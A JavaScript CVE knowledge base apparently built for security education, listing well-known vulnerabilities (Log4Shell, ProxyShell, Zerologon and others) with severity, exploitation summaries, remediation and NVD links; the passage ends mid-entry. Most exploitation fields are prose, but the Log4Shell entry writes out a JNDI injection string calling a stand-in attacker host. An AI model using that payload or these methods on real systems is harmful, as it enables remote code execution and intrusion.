// Copyright (c) 2026 SpartanKing18. All rights reserved.
// CVE knowledge base for security education.

export const CVE_DB = [
  // ============================================================
  // WEB APPLICATION VULNERABILITIES (50+)
  // ============================================================

  {
    id: "CVE-2021-44228",
    name: "Log4Shell",
    severity: "Critical",
    cvss: 10.0,
    affected: "Apache Log4j 2.0-beta9 to 2.14.1",
    description: "Remote code execution via JNDI lookup injection in log messages. The Log4j library processes specially crafted log messages containing JNDI lookup expressions, allowing attackers to execute arbitrary code on the server.",
    exploitation: "Send a crafted string such as ${jndi:ldap://attacker.com/a} in any user-controlled input that gets logged by the application.",
    remediation: "Upgrade to Log4j 2.17.0 or later. As a temporary mitigation, set the system property log4j2.formatMsgNoLookups=true or remove the JndiLookup class from the classpath.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-44228"]
  },
  {
    id: "CVE-2021-45046",
    name: "Log4Shell Bypass",
    severity: "Critical",
    cvss: 9.0,
    affected: "Apache Log4j 2.0-beta9 to 2.15.0",
    description: "Incomplete fix for CVE-2021-44228. Thread Context Map patterns in certain non-default configurations still allowed JNDI injection leading to remote code execution.",
    exploitation: "Craft a malicious input using Thread Context Map data patterns that bypass the initial Log4Shell fix restrictions.",
    remediation: "Upgrade to Log4j 2.17.0 or later. The 2.16.0 fix was also found to be incomplete.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-45046"]
  },
  {
    id: "CVE-2021-45105",
    name: "Log4j Denial of Service",
    severity: "High",
    cvss: 7.5,
    affected: "Apache Log4j 2.0-beta9 to 2.16.0",
    description: "Uncontrolled recursion from self-referential lookups in Log4j when a non-default Pattern Layout with a Context Lookup is used, allowing denial of service via crafted input.",
    exploitation: "Send input containing recursive lookup patterns that cause infinite recursion in the logging framework.",
    remediation: "Upgrade to Log4j 2.17.0 or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-45105"]
  },
  {
    id: "CVE-2017-5638",
    name: "Apache Struts 2 RCE",
    severity: "Critical",
    cvss: 10.0,
    affected: "Apache Struts 2.3.5 to 2.3.31, 2.5 to 2.5.10",
    description: "Remote code execution in the Jakarta Multipart parser of Apache Struts 2. An invalid Content-Type header triggers an exception that is used to create an OGNL expression, which is then evaluated.",
    exploitation: "Send a crafted Content-Type HTTP header containing an OGNL expression to any endpoint using the Jakarta Multipart parser.",
    remediation: "Upgrade to Apache Struts 2.3.32 or 2.5.10.1. Alternatively, switch to a different multipart parser implementation.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2017-5638"]
  },
  {
    id: "CVE-2019-0708",
    name: "BlueKeep",
    severity: "Critical",
    cvss: 9.8,
    affected: "Windows XP, Windows 7, Windows Server 2003, 2008, 2008 R2",
    description: "Remote code execution in Remote Desktop Services (RDS), formerly Terminal Services. A pre-authentication vulnerability allows an unauthenticated attacker to send specially crafted requests to execute arbitrary code.",
    exploitation: "Send specially crafted RDP packets to port 3389 to trigger a use-after-free in the RDP kernel driver.",
    remediation: "Apply Microsoft security update KB4499175. Enable Network Level Authentication as a partial mitigation. Disable RDP if not needed.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2019-0708"]
  },
  {
    id: "CVE-2021-26855",
    name: "ProxyLogon",
    severity: "Critical",
    cvss: 9.8,
    affected: "Microsoft Exchange Server 2013, 2016, 2019",
    description: "Server-Side Request Forgery (SSRF) vulnerability in Microsoft Exchange Server allowing an unauthenticated attacker to send arbitrary HTTP requests and authenticate as the Exchange server.",
    exploitation: "Send crafted HTTP requests to the Exchange server's OWA endpoint to exploit the SSRF and gain authenticated access to backend services.",
    remediation: "Apply the March 2021 Microsoft Exchange security updates. Restrict untrusted connections to Exchange servers.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-26855"]
  },
  {
    id: "CVE-2021-34473",
    name: "ProxyShell (SSRF)",
    severity: "Critical",
    cvss: 9.8,
    affected: "Microsoft Exchange Server 2013, 2016, 2019",
    description: "Pre-authentication SSRF in Microsoft Exchange Server that allows unauthenticated attackers to access backend services. Part of the ProxyShell attack chain.",
    exploitation: "Chain this SSRF with CVE-2021-34523 (privilege escalation) and CVE-2021-31207 (arbitrary file write) to achieve remote code execution.",
    remediation: "Apply the April 2021 and May 2021 Microsoft Exchange cumulative updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-34473"]
  },
  {
    id: "CVE-2021-34523",
    name: "ProxyShell (Privilege Escalation)",
    severity: "Critical",
    cvss: 9.8,
    affected: "Microsoft Exchange Server 2013, 2016, 2019",
    description: "Privilege escalation vulnerability in Microsoft Exchange Server's PowerShell backend that allows an attacker with mailbox access to execute arbitrary PowerShell commands as SYSTEM.",
    exploitation: "Use the SSRF from CVE-2021-34473 to reach the PowerShell backend and escalate privileges by manipulating the X-Rps-CAT token.",
    remediation: "Apply the April 2021 Microsoft Exchange cumulative updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-34523"]
  },
  {
    id: "CVE-2021-31207",
    name: "ProxyShell (Arbitrary File Write)",
    severity: "High",
    cvss: 7.2,
    affected: "Microsoft Exchange Server 2013, 2016, 2019",
    description: "Post-authentication arbitrary file write in Microsoft Exchange Server via the mailbox export feature. Completes the ProxyShell RCE chain.",
    exploitation: "After gaining elevated privileges via CVE-2021-34523, export a mailbox containing a web shell payload to write arbitrary files to the server.",
    remediation: "Apply the May 2021 Microsoft Exchange cumulative updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-31207"]
  },
  {
    id: "CVE-2021-26858",
    name: "ProxyLogon (Arbitrary File Write)",
    severity: "High",
    cvss: 7.8,
    affected: "Microsoft Exchange Server 2013, 2016, 2019",
    description: "Post-authentication arbitrary file write vulnerability in Microsoft Exchange Server. Part of the ProxyLogon attack chain used by HAFNIUM threat group.",
    exploitation: "After authenticating via CVE-2021-26855, write arbitrary files to the server to deploy web shells.",
    remediation: "Apply the March 2021 Microsoft Exchange security updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-26858"]
  },
  {
    id: "CVE-2023-34362",
    name: "MOVEit Transfer SQL Injection",
    severity: "Critical",
    cvss: 9.8,
    affected: "Progress MOVEit Transfer before 2021.0.6, 2021.1.4, 2022.0.4, 2022.1.5, 2023.0.1",
    description: "SQL injection vulnerability in the MOVEit Transfer web application allowing unauthenticated attackers to access the database and execute arbitrary code.",
    exploitation: "Send crafted SQL injection payloads to the MOVEit Transfer web interface to manipulate the database and deploy web shells.",
    remediation: "Apply the Progress MOVEit Transfer security patches. Block HTTP/HTTPS traffic to the MOVEit Transfer environment until patched.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-34362"]
  },
  {
    id: "CVE-2023-44487",
    name: "HTTP/2 Rapid Reset",
    severity: "High",
    cvss: 7.5,
    affected: "Multiple HTTP/2 implementations including nginx, Apache httpd, Node.js, Go net/http",
    description: "Denial of service vulnerability in the HTTP/2 protocol. Attackers send a large number of HTTP/2 requests and immediately cancel them, exhausting server resources while remaining under connection limits.",
    exploitation: "Open an HTTP/2 connection and rapidly send HEADERS frames followed by RST_STREAM frames to consume server resources.",
    remediation: "Apply vendor-specific patches. Implement rate limiting on RST_STREAM frames. Consider limiting concurrent streams per connection.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-44487"]
  },
  {
    id: "CVE-2019-11510",
    name: "Pulse Secure VPN Arbitrary File Read",
    severity: "Critical",
    cvss: 10.0,
    affected: "Pulse Secure Pulse Connect Secure before 8.2R12.1, 8.3R7.1, 9.0R3.4",
    description: "Unauthenticated arbitrary file reading vulnerability in Pulse Secure VPN allowing attackers to retrieve sensitive files including cached plaintext credentials.",
    exploitation: "Send a crafted HTTP request with directory traversal sequences to read arbitrary files from the VPN appliance, including session data and credentials.",
    remediation: "Upgrade to the latest version of Pulse Connect Secure. Reset all user and admin credentials after patching.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2019-11510"]
  },
  {
    id: "CVE-2019-19781",
    name: "Citrix ADC Directory Traversal",
    severity: "Critical",
    cvss: 9.8,
    affected: "Citrix ADC and Gateway versions 10.5, 11.1, 12.0, 12.1, 13.0",
    description: "Directory traversal vulnerability in Citrix Application Delivery Controller and Gateway allowing unauthenticated remote code execution.",
    exploitation: "Send a crafted HTTP request with path traversal sequences to write and execute arbitrary files on the Citrix appliance.",
    remediation: "Apply the Citrix firmware updates. Use the Citrix-provided mitigation script as a temporary measure.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2019-19781"]
  },
  {
    id: "CVE-2020-1472",
    name: "Zerologon",
    severity: "Critical",
    cvss: 10.0,
    affected: "Windows Server 2008 R2 through 2019",
    description: "Privilege escalation in the Netlogon Remote Protocol (MS-NRPC). A flaw in the AES-CFB8 implementation allows an attacker to establish a vulnerable Netlogon session and change the computer password of a domain controller.",
    exploitation: "Send Netlogon authentication attempts with all-zero client credentials. Due to the cryptographic flaw, authentication succeeds after approximately 256 attempts.",
    remediation: "Apply the August 2020 Microsoft security updates. Enable secure RPC for Netlogon channel.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2020-1472"]
  },
  {
    id: "CVE-2018-13379",
    name: "FortiGate VPN Path Traversal",
    severity: "Critical",
    cvss: 9.8,
    affected: "Fortinet FortiOS 5.6.3 to 5.6.7, 6.0.0 to 6.0.4",
    description: "Path traversal vulnerability in the FortiGate SSL VPN web portal allowing unauthenticated attackers to download system files, including plaintext credentials.",
    exploitation: "Send a crafted HTTP request with path traversal to the VPN web portal to read the session file containing plaintext usernames and passwords.",
    remediation: "Upgrade FortiOS to 5.6.8, 6.0.5, or 6.2.0 and above. Reset all VPN credentials after patching.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2018-13379"]
  },
  {
    id: "CVE-2020-5902",
    name: "F5 BIG-IP TMUI RCE",
    severity: "Critical",
    cvss: 9.8,
    affected: "F5 BIG-IP versions 11.6.x, 12.1.x, 13.1.x, 14.1.x, 15.0.x, 15.1.x",
    description: "Remote code execution in the Traffic Management User Interface (TMUI) of F5 BIG-IP, also known as the Configuration utility. Path traversal allows unauthenticated access to internal endpoints.",
    exploitation: "Send HTTP requests with path traversal sequences to bypass authentication on the TMUI and execute arbitrary system commands.",
    remediation: "Apply the F5 hotfix. Restrict access to the TMUI management interface. Use iRules as a temporary mitigation.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2020-5902"]
  },
  {
    id: "CVE-2017-9841",
    name: "PHPUnit Remote Code Execution",
    severity: "Critical",
    cvss: 9.8,
    affected: "PHPUnit before 4.8.28 and 5.x before 5.6.3",
    description: "Remote code execution via the Util/PHP/eval-stdin.php script that is accessible when PHPUnit is deployed with a web application and the vendor directory is publicly accessible.",
    exploitation: "Send a POST request with PHP code in the body to the eval-stdin.php file exposed in the vendor directory.",
    remediation: "Upgrade PHPUnit to 4.8.28 or 5.6.3+. Remove the vendor directory from public web access. Delete the eval-stdin.php file.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2017-9841"]
  },
  {
    id: "CVE-2018-7600",
    name: "Drupalgeddon 2",
    severity: "Critical",
    cvss: 9.8,
    affected: "Drupal 7.x before 7.58, 8.x before 8.3.9, 8.4.x before 8.4.6, 8.5.x before 8.5.1",
    description: "Remote code execution in Drupal core due to insufficient input validation in the Form API. Allows unauthenticated attackers to execute arbitrary code.",
    exploitation: "Send a crafted request to the user registration form or other Form API endpoints to inject and execute arbitrary PHP code.",
    remediation: "Upgrade to Drupal 7.58, 8.3.9, 8.4.6, or 8.5.1. Apply the patch if upgrade is not immediately possible.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2018-7600"]
  },
  {
    id: "CVE-2019-6340",
    name: "Drupalgeddon 3",
    severity: "Critical",
    cvss: 9.8,
    affected: "Drupal 8.5.x before 8.5.11, 8.6.x before 8.6.10",
    description: "Remote code execution via RESTful Web Services or JSON:API module in Drupal. Deserialization of untrusted data allows arbitrary code execution.",
    exploitation: "Send a crafted PATCH request with serialized PHP objects to a REST-enabled Drupal endpoint to achieve code execution.",
    remediation: "Upgrade to Drupal 8.5.11 or 8.6.10. Disable REST resources that accept PATCH or POST requests as a temporary mitigation.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2019-6340"]
  },
  {
    id: "CVE-2014-0160",
    name: "Heartbleed",
    severity: "High",
    cvss: 7.5,
    affected: "OpenSSL 1.0.1 through 1.0.1f",
    description: "Buffer over-read in the TLS heartbeat extension of OpenSSL allowing attackers to read up to 64KB of server memory per request, potentially exposing private keys, session tokens, and user data.",
    exploitation: "Send a malformed TLS heartbeat request with a large length field but a small payload, causing OpenSSL to return memory contents beyond the buffer.",
    remediation: "Upgrade to OpenSSL 1.0.1g or later. Revoke and reissue TLS certificates. Reset user passwords and session tokens.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2014-0160"]
  },
  {
    id: "CVE-2014-6271",
    name: "Shellshock",
    severity: "Critical",
    cvss: 9.8,
    affected: "GNU Bash through 4.3",
    description: "Arbitrary command execution via specially crafted environment variables in GNU Bash. Function definitions in environment variables are not properly parsed, allowing trailing commands to execute.",
    exploitation: "Set an environment variable containing a Bash function definition followed by arbitrary commands. When a new Bash shell is spawned, the trailing commands execute automatically.",
    remediation: "Upgrade GNU Bash to version 4.3 patch 25 or later. Apply vendor-specific patches for all systems running Bash.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2014-6271"]
  },
  {
    id: "CVE-2017-0199",
    name: "Microsoft Office OLE2Link RCE",
    severity: "High",
    cvss: 7.8,
    affected: "Microsoft Office 2007, 2010, 2013, 2016; Windows Vista through 10",
    description: "Remote code execution via a crafted Microsoft Office document using OLE2Link objects. Opening a document containing a malicious OLE2 linked object triggers download and execution of an HTA file.",
    exploitation: "Craft a Word document with an embedded OLE2Link object pointing to a remote HTA file. When the victim opens the document, the HTA payload executes.",
    remediation: "Apply Microsoft security update KB4014793. Enable Protected View for documents from the internet.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2017-0199"]
  },
  {
    id: "CVE-2021-40444",
    name: "MSHTML Remote Code Execution",
    severity: "High",
    cvss: 7.8,
    affected: "Windows Server 2008 through 2022, Windows 7 through 11",
    description: "Remote code execution via crafted Microsoft Office documents that exploit the MSHTML browser rendering engine. An ActiveX control embedded in a document triggers code execution.",
    exploitation: "Craft an Office document with a malicious ActiveX control that leverages MSHTML to download and execute a CAB archive containing a DLL payload.",
    remediation: "Apply the September 2021 Microsoft security updates. Disable ActiveX controls in Internet Explorer as a temporary mitigation.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-40444"]
  },
  {
    id: "CVE-2023-23397",
    name: "Microsoft Outlook Privilege Escalation",
    severity: "Critical",
    cvss: 9.8,
    affected: "Microsoft Outlook for Windows, all versions before March 2023 patch",
    description: "Privilege escalation in Microsoft Outlook where a specially crafted email triggers an NTLM authentication request to an attacker-controlled server, leaking the victim's Net-NTLMv2 hash without user interaction.",
    exploitation: "Send an email with a crafted PidLidReminderFileParameter property pointing to an attacker-controlled UNC path. The NTLM hash is leaked when Outlook processes the reminder.",
    remediation: "Apply the March 2023 Microsoft security updates. Block outbound SMB (TCP 445) connections to untrusted networks.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-23397"]
  },
  {
    id: "CVE-2022-22965",
    name: "Spring4Shell",
    severity: "Critical",
    cvss: 9.8,
    affected: "Spring Framework 5.3.0 to 5.3.17, 5.2.0 to 5.2.19 on JDK 9+",
    description: "Remote code execution in Spring Framework via data binding to class loader properties when running on Apache Tomcat with JDK 9 or higher. Allows writing a web shell via manipulated class loader access log properties.",
    exploitation: "Send crafted HTTP requests to modify Tomcat's access log configuration through Spring data binding, writing a JSP web shell to the web root.",
    remediation: "Upgrade to Spring Framework 5.3.18 or 5.2.20. Upgrade to Spring Boot 2.6.6 or 2.5.12.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-22965"]
  },
  {
    id: "CVE-2022-22963",
    name: "Spring Cloud Function SpEL Injection",
    severity: "Critical",
    cvss: 9.8,
    affected: "Spring Cloud Function 3.1.6, 3.2.2 and older",
    description: "Remote code execution via Spring Expression Language (SpEL) injection in the routing functionality of Spring Cloud Function.",
    exploitation: "Send an HTTP request with a crafted spring.cloud.function.routing-expression header containing a SpEL expression to execute arbitrary commands.",
    remediation: "Upgrade to Spring Cloud Function 3.1.7 or 3.2.3.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-22963"]
  },
  {
    id: "CVE-2022-26134",
    name: "Confluence OGNL Injection",
    severity: "Critical",
    cvss: 9.8,
    affected: "Atlassian Confluence Server and Data Center, all versions before 7.4.17, 7.13.7, 7.14.3, 7.15.2, 7.16.4, 7.17.4, 7.18.1",
    description: "Unauthenticated remote code execution via OGNL injection in Atlassian Confluence Server and Data Center. Exploited in the wild as a zero-day.",
    exploitation: "Send an HTTP request with a crafted URI containing an OGNL expression that gets evaluated by the Confluence server.",
    remediation: "Upgrade to a fixed version of Confluence. Implement WAF rules to block OGNL injection attempts.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-26134"]
  },
  {
    id: "CVE-2023-22515",
    name: "Confluence Broken Access Control",
    severity: "Critical",
    cvss: 10.0,
    affected: "Atlassian Confluence Data Center and Server 8.0.0 to 8.5.1",
    description: "Broken access control vulnerability allowing unauthenticated attackers to create administrator accounts on publicly accessible Confluence instances.",
    exploitation: "Send crafted HTTP requests to the Confluence setup endpoints to create a new administrator account without authentication.",
    remediation: "Upgrade to Confluence 8.3.3, 8.4.3, or 8.5.2. Restrict external network access to Confluence instances.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-22515"]
  },
  {
    id: "CVE-2023-22518",
    name: "Confluence Improper Authorization",
    severity: "Critical",
    cvss: 9.8,
    affected: "Atlassian Confluence Data Center and Server all versions before 7.19.16, 8.3.4, 8.4.4, 8.5.3, 8.6.1",
    description: "Improper authorization vulnerability in Confluence Data Center and Server allowing unauthenticated attackers to reset the Confluence instance and create new administrator accounts.",
    exploitation: "Send requests to the Confluence restore endpoints to overwrite the database and reset the instance, then create an admin account.",
    remediation: "Upgrade to a fixed version. Restrict external access to the Confluence /json/setup-restore endpoints.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-22518"]
  },
  {
    id: "CVE-2021-21972",
    name: "VMware vCenter Server RCE",
    severity: "Critical",
    cvss: 9.8,
    affected: "VMware vCenter Server 6.5, 6.7, 7.0",
    description: "Remote code execution in the vSphere Client plugin for VMware vCenter Server. An unauthenticated attacker with network access to port 443 can upload and execute arbitrary files.",
    exploitation: "Send crafted requests to the vROps plugin endpoint to upload a web shell or executable to the vCenter server.",
    remediation: "Apply VMware security update VMSA-2021-0002. Disable the vROps plugin as a temporary workaround.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-21972"]
  },
  {
    id: "CVE-2020-14882",
    name: "Oracle WebLogic Server RCE",
    severity: "Critical",
    cvss: 9.8,
    affected: "Oracle WebLogic Server 10.3.6.0, 12.1.3.0, 12.2.1.3, 12.2.1.4, 14.1.1.0",
    description: "Remote code execution in Oracle WebLogic Server via an unauthenticated HTTP request. A path traversal in the admin console allows bypassing authentication.",
    exploitation: "Send an HTTP request with double-encoded path traversal sequences to bypass authentication on the WebLogic console, then exploit CVE-2020-14883 to execute commands.",
    remediation: "Apply the October 2020 Oracle Critical Patch Update. Restrict access to the WebLogic admin console.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2020-14882"]
  },
  {
    id: "CVE-2018-11776",
    name: "Apache Struts 2 Namespace RCE",
    severity: "Critical",
    cvss: 9.8,
    affected: "Apache Struts 2.3 to 2.3.34, 2.5 to 2.5.16",
    description: "Remote code execution in Apache Struts when the alwaysSelectFullNamespace flag is true and certain action configurations use a wildcard namespace.",
    exploitation: "Craft a URL with a malicious OGNL expression as the namespace to achieve remote code execution through Struts result processing.",
    remediation: "Upgrade to Apache Struts 2.3.35 or 2.5.17.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2018-11776"]
  },
  {
    id: "CVE-2017-12149",
    name: "JBoss Deserialization RCE",
    severity: "Critical",
    cvss: 9.8,
    affected: "Red Hat JBoss Enterprise Application Platform 5.x and 6.x",
    description: "Remote code execution via Java deserialization of untrusted data in the HttpInvoker component of JBoss Application Server.",
    exploitation: "Send a crafted serialized Java object to the HttpInvoker endpoint to execute arbitrary code on the JBoss server.",
    remediation: "Upgrade JBoss EAP to a supported version. Disable the HttpInvoker servlet if not required.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2017-12149"]
  },
  {
    id: "CVE-2020-0688",
    name: "Microsoft Exchange Validation Key RCE",
    severity: "High",
    cvss: 8.8,
    affected: "Microsoft Exchange Server 2010, 2013, 2016, 2019",
    description: "Remote code execution in Microsoft Exchange Server due to the use of a static validation key for ViewState. Allows any authenticated user to execute arbitrary code as SYSTEM.",
    exploitation: "Use the known static validationKey and validationAlgorithm to craft a malicious ViewState payload and send it to the Exchange Control Panel.",
    remediation: "Apply the February 2020 Microsoft security updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2020-0688"]
  },
  {
    id: "CVE-2022-41040",
    name: "ProxyNotShell (SSRF)",
    severity: "High",
    cvss: 8.8,
    affected: "Microsoft Exchange Server 2013, 2016, 2019",
    description: "Server-Side Request Forgery vulnerability in Microsoft Exchange Server allowing authenticated attackers to remotely trigger code execution when chained with CVE-2022-41082.",
    exploitation: "Use a valid Exchange credential to send crafted requests similar to ProxyShell but with a different authentication mechanism, chaining with the PowerShell endpoint for RCE.",
    remediation: "Apply the November 2022 Microsoft Exchange security updates. Apply the URL Rewrite mitigation rule as an interim fix.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-41040"]
  },
  {
    id: "CVE-2022-41082",
    name: "ProxyNotShell (RCE)",
    severity: "High",
    cvss: 8.8,
    affected: "Microsoft Exchange Server 2013, 2016, 2019",
    description: "Remote code execution in Microsoft Exchange Server PowerShell backend when chained with CVE-2022-41040 SSRF. The second stage of the ProxyNotShell attack chain.",
    exploitation: "After using CVE-2022-41040 to reach the PowerShell backend, exploit the deserialization vulnerability to execute arbitrary code.",
    remediation: "Apply the November 2022 Microsoft Exchange security updates.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-41082"]
  },
  {
    id: "CVE-2023-42793",
    name: "JetBrains TeamCity Authentication Bypass",
    severity: "Critical",
    cvss: 9.8,
    affected: "JetBrains TeamCity before 2023.05.4",
    description: "Authentication bypass in JetBrains TeamCity allowing unauthenticated attackers to perform admin actions on the server, including creating admin accounts and executing arbitrary code.",
    exploitation: "Send crafted requests to the TeamCity server's internal API endpoints to bypass authentication and create a new administrator account.",
    remediation: "Upgrade to TeamCity 2023.05.4 or later. Apply the security patch plugin for older versions.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-42793"]
  },
  {
    id: "CVE-2024-3094",
    name: "XZ Utils Backdoor",
    severity: "Critical",
    cvss: 10.0,
    affected: "XZ Utils 5.6.0, 5.6.1",
    description: "Supply chain backdoor in XZ Utils compression library. Malicious code was injected into the build process through compromised test files, allowing unauthorized remote access via SSH on systems using systemd and linked against liblzma.",
    exploitation: "The backdoor modifies the behavior of sshd through liblzma, allowing an attacker with a specific Ed448 key to execute commands before authentication.",
    remediation: "Downgrade XZ Utils to version 5.4.x. Rebuild any packages linked against the compromised liblzma versions.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2024-3094"]
  },
  {
    id: "CVE-2021-3156",
    name: "Baron Samedit (Sudo Heap Overflow)",
    severity: "High",
    cvss: 7.8,
    affected: "Sudo before 1.9.5p2 (legacy versions 1.8.2 to 1.8.31p2)",
    description: "Heap-based buffer overflow in sudo when processing command-line arguments in sudoedit mode. Allows any local user to gain root privileges.",
    exploitation: "Invoke sudoedit with a crafted command-line argument containing escaped backslashes that trigger a heap overflow in the argument parsing logic.",
    remediation: "Upgrade sudo to version 1.9.5p2 or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-3156"]
  },
  {
    id: "CVE-2020-25213",
    name: "WordPress File Manager Plugin RCE",
    severity: "Critical",
    cvss: 9.8,
    affected: "WordPress File Manager plugin before 6.9",
    description: "Remote code execution in the WordPress File Manager plugin due to improper access control on the connector.minimal.php endpoint, allowing unauthenticated file upload.",
    exploitation: "Send a crafted multipart POST request to the elFinder connector endpoint to upload and execute a PHP web shell.",
    remediation: "Update the File Manager plugin to version 6.9 or later. Remove the plugin if not needed.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2020-25213"]
  },
  {
    id: "CVE-2019-17558",
    name: "Apache Solr Velocity Template RCE",
    severity: "Critical",
    cvss: 9.8,
    affected: "Apache Solr 5.0.0 to 8.3.1",
    description: "Remote code execution in Apache Solr via the VelocityResponseWriter. Allows authenticated attackers to execute arbitrary Velocity templates containing Java code.",
    exploitation: "Enable the VelocityResponseWriter via the Config API, then send a search request with a custom Velocity template that executes system commands.",
    remediation: "Upgrade to Apache Solr 8.4.0 or later. Disable the VelocityResponseWriter.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2019-17558"]
  },
  {
    id: "CVE-2022-1388",
    name: "F5 BIG-IP iControl REST Authentication Bypass",
    severity: "Critical",
    cvss: 9.8,
    affected: "F5 BIG-IP 16.1.x before 16.1.2.2, 15.1.x before 15.1.5.1, 14.1.x before 14.1.4.6, 13.1.x before 13.1.5, 12.1.x (all), 11.6.x (all)",
    description: "Authentication bypass in the iControl REST interface of F5 BIG-IP allowing unauthenticated attackers with network access to execute arbitrary system commands.",
    exploitation: "Send crafted HTTP requests to the iControl REST endpoint with specific headers that bypass authentication, then use the bash endpoint to execute commands.",
    remediation: "Upgrade to a fixed version. Restrict access to the iControl REST interface. Block iControl REST access through the self IP address.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-1388"]
  },
  {
    id: "CVE-2020-17530",
    name: "Apache Struts 2 OGNL Injection",
    severity: "Critical",
    cvss: 9.8,
    affected: "Apache Struts 2.0.0 to 2.5.25",
    description: "Remote code execution via double OGNL evaluation when a developer uses forced evaluation with the %{...} syntax on tag attributes that can be controlled by an attacker.",
    exploitation: "Provide input that gets double-evaluated through Struts tag attributes using forced OGNL evaluation, executing arbitrary code on the server.",
    remediation: "Upgrade to Apache Struts 2.5.26 or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2020-17530"]
  },
  {
    id: "CVE-2021-22986",
    name: "F5 BIG-IP iControl REST Unauthenticated RCE",
    severity: "Critical",
    cvss: 9.8,
    affected: "F5 BIG-IP 16.0.x, 15.1.x, 14.1.x, 13.1.x, 12.1.x; BIG-IQ 8.0.0, 7.1.0, 7.0.0, 6.0.0",
    description: "Unauthenticated remote code execution via the iControl REST interface in F5 BIG-IP and BIG-IQ, allowing an attacker to execute arbitrary commands as root.",
    exploitation: "Send crafted requests to the iControl REST API token generation endpoint to bypass authentication and gain code execution.",
    remediation: "Apply the March 2021 F5 security advisory hotfixes. Block external access to the management interface.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-22986"]
  },
  {
    id: "CVE-2021-22205",
    name: "GitLab CE/EE RCE via Image Processing",
    severity: "Critical",
    cvss: 10.0,
    affected: "GitLab CE/EE 11.9 to 13.8.8, 13.9 to 13.9.6, 13.10 to 13.10.3",
    description: "Remote code execution in GitLab via an image processing vulnerability in ExifTool. Unauthenticated attackers can exploit the file upload functionality to execute arbitrary commands.",
    exploitation: "Upload a crafted DjVu or JPEG image containing embedded commands that get executed by the ExifTool metadata parser.",
    remediation: "Upgrade to GitLab 13.8.8, 13.9.6, or 13.10.3. Update ExifTool to version 12.24 or later.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2021-22205"]
  },
  {
    id: "CVE-2022-30190",
    name: "Follina (MSDT RCE)",
    severity: "High",
    cvss: 7.8,
    affected: "Windows 7 through 11, Windows Server 2008 through 2022",
    description: "Remote code execution via the Microsoft Support Diagnostic Tool (MSDT). A crafted Office document uses an OLE object pointing to an HTML file that invokes MSDT with PowerShell commands.",
    exploitation: "Create an Office document with an OLE reference to an HTML file containing an ms-msdt: URL scheme payload that executes PowerShell commands when the document is previewed or opened.",
    remediation: "Apply the June 2022 Microsoft security updates. Disable the MSDT URL protocol as an interim fix by deleting the HKCR:\\ms-msdt registry key.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2022-30190"]
  },
  {
    id: "CVE-2023-27997",
    name: "FortiGate SSL VPN Heap Overflow",
    severity: "Critical",
    cvss: 9.8,
    affected: "FortiOS 6.0.x, 6.2.x, 6.4.x before 6.4.13, 7.0.x before 7.0.12, 7.2.x before 7.2.5",
    description: "Pre-authentication heap-based buffer overflow in the FortiGate SSL VPN allowing remote code execution. Exploitable by sending crafted requests to the VPN web portal.",
    exploitation: "Send specially crafted requests to the FortiGate SSL VPN interface to trigger a heap overflow and achieve code execution on the appliance.",
    remediation: "Upgrade FortiOS to 6.4.13, 7.0.12, or 7.2.5 and above.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2023-27997"]
  },
  {
    id: "CVE-2019-2725",
    name: "Oracle WebLogic Deserialization RCE",
    severity: "Critical",
    cvss: 9.8,
    affected: "Oracle WebLogic Server 10.3.6.0, 12.1.3.0",
    description: "Remote code execution via deserialization of untrusted data in the wls9_async and wls-wsat components of Oracle WebLogic Server.",
    exploitation: "Send a crafted SOAP XML request containing a serialized Java object to the wls9_async or wls-wsat endpoint.",
    remediation: "Apply the April 2019 Oracle Critical Patch Update. Remove access to the affected endpoints if not needed.",
    references: ["https://nvd.nist.gov/vuln/detail/CVE-2019-2725"]
  },

  // ============================================================
  // WINDOWS VULNERABILITIES (25+)
  // ============================================================

  {
    id: "CVE-2017-0144",
    name: "EternalBlue",
    severity: "Critical",
